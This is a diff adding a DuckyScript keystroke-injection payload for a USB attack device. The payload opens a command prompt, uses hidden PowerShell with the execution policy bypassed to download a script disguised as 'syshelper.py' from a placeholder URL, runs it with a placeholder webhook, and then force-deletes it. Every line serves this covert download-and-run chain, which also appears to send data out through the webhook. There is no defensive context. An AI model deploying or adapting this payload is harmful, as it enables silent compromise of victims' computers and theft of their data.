@@ -1,0 +1,12 @@
+DELAY 1000
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 1000
+STRING powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command "(Invoke-WebRequest -Uri '<your app url>' -OutFile 'C:\\Users\\Public\\syshelper.py')"
+ENTER
+DELAY 3000
+STRING powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command "python 'C:\\Users\\Public\\syshelper.py' '<your webhook here>'; Remove-Item 'C:\\Users\\Public\\syshelper.py' -Force"
+ENTER
+DELAY 5000
